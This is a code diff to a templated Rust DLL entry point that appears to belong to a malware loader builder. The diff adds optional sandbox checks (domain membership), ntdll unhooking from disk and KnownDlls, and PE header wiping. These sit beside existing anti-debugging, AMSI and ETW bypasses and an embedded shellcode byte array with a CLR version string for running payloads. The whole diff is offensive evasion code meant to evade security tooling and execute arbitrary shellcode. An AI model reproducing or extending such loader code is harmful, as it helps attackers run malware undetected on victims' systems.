@@ -8,8 +8,17 @@ pub unsafe extern "system" fn DllMain(
         {%- if "AntiDebug" in feature_names %}
         if scaffold::evasion::anti_debug::is_debugged() { return 1; }
         {%- endif %}
+        {%- if "SandboxDomain" in feature_names %}
+        if !scaffold::sandbox::domain::is_domain_joined() { return 1; }
+        {%- endif %}
         {%- if "SandboxUser" in feature_names %}
         if !scaffold::sandbox::usercheck::looks_real() { return 1; }
+        {%- endif %}
+        {%- if "UnhookDisk" in feature_names %}
+        scaffold::evasion::unhook::unhook_ntdll_disk();
+        {%- endif %}
+        {%- if "UnhookKnownDlls" in feature_names %}
+        scaffold::evasion::unhook::unhook_ntdll_knowndlls();
         {%- endif %}
         {%- if "AmsiHwbp" in feature_names %}
         scaffold::bypass::amsi_hwbp::install_amsi_bypass();
@@ -18,6 +27,11 @@ pub unsafe extern "system" fn DllMain(
         scaffold::bypass::etw_hwbp::install_etw_bypass();
         scaffold::bypass::etw_hwbp::patch_etw_full();
         {%- endif %}
+        {%- if "PeCloak" in feature_names %}
+        scaffold::evasion::pe_cloak::wipe_pe_headers();
+        {%- endif %}
+
+        // CLR version "v4.0.30319" as UTF-16 LE
         let {{ v.var_key }}_v: &[u16] = &[118u16, 52u16, 46u16, 48u16, 46u16, 51u16, 48u16, 51u16, 49u16, 57u16, 0u16];
         let {{ v.var_shellcode }}: &[u8] = &[
             {%- for byte in config.shellcode_hex | hex_bytes %}{{ byte }},{% endfor %}
